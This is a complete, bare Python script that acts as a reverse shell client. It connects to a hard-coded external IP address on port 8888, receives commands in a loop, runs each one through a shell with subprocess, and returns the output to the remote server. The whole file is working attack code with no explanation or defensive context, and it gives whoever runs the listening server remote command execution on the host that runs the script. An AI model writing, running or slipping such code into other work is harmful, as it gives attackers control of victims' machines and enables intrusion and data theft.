import socket
import subprocess

host = '2.235.240.156'
port = 8888

client = socket.socket()
client.connect((host,port))
print('{[+]} CONNECT TO SERVER')

while True:
    print("{[!]} WAITING ")
    command = client.recv(1024)
    command = command.decode()

    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()

    print("{[+]} SENDING OUTPUT")
    client.send(output + output_error)
